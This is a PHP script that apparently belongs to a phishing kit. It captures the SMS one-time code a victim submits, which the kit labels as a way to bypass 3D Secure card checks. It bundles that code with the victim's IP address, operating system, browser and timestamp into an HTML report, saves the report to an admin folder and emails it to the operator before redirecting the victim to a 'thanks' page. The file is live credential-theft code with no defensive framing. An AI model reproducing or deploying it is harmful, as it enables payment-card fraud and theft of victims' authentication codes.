<?php
	
	/*ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);*/

	session_start();
	include("../system.php");

	$_SESSION["smscode"] = $_POST["smpass"];
	
	if(isset($_POST["smpass"])) {
		$valhallaletter = '
			<!DOCTYPE html>
			<html>
			<head><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}</style>
			</head>
			<body>
				<div style="height:100%;min-height: 100vh;width:100%;background-color: #0a0a0a;background-image: radial-gradient(circle farthest-side at center bottom,#0a0a0a,#c71812 125%);padding: 25px 0">
					<div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">

						<div><img src="https://i.imgur.com/4LQAiAh.jpg" style="height: 50px;margin:0 auto;display: block;"></div>

						<h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">SMS RIO FR3SH 🤑</h1>
						<div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🍰Sms Pour Bypass 3D Secure :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
									'. $_SESSION["smscode"] .'
								</h2>
							</div>
						</div>
						<h1 style="color: #fff;text-align: center;padding: 0 0 20px 0;font-family: arial;">👁‍🗨User Agent</h1>
						<div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🌑Date & Temps :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
									'. $date .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">💻Addresse IP :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;">
									<a style="color: #c71812" target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a>
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">👉System :	</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
									'. $user_os .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🤖Navigateur :	</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
									'. $user_browser .'
								</h2>
							</div>
						</div>

					</div>
				</div>
			</body>
			</html>';

		$file = fopen("../../../admin/".$ip.".html", "a");
		fwrite($file, $valhallaletter);

		include("../../../e-mail.php");

		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$subject  = "valhalla RIO 🦅";
		$headers .= "From: Evil Rick RZLT 😈 <valhalla@websec.com>" . "\r\n";
		mail($valhallato, $subject, $valhallaletter, $headers);

		header("Location: ../../app/thanks.php");

	} else {
		header("Location: ../../app/sms.php?error");
	}